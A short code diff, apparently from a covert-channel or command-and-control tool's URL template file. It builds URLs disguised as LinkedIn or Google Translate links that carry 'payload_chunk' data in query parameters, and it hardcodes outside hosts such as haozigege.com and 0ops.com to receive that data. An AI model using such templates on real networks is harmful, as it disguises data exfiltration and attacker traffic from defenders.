@@ -11,7 +11,7 @@ http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google
 #http://www.linkedin.com/profile/view?id=${ tpl.rand_number(8) }&pid=${ tpl.rand_number(8) }&authType=name&authToken=${ tpl.rand_chars(4) }&goback=C${ tpl.rand_chars(1) }&report%2Esuccess=${ tpl.payload_chunk(62) }
 #http://www.linkedin.com/profile/view?id=${ tpl.rand_number(8) }&authType=NAME_SEARCH&authToken=${ tpl.rand_chars(4) }&locale=${ tpl.rand_domain() }&srchid=${ tpl.payload_chunk(38) }&srchindex=1&srchtotal=6&goback=C${ tpl.rand_chars(1) }&pvs=ps&trk=pp_profile_photo_link
 
-http://${ tpl.get_url_base() }/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
-http://${ tpl.get_url_base() }/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
-http://${ tpl.get_url_agent() }?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
-http://${ tpl.get_url_agent() }?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
+http://haozigege.com/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
+http://redbud.com/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
+http://haozigege.com/?${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }&${ tpl.rand_chars(2) }=${ tpl.payload_chunk(30,20) }
+http://0ops.com/?${ tpl.rand_chars(3) }=${ tpl.payload_chunk(30,20) }
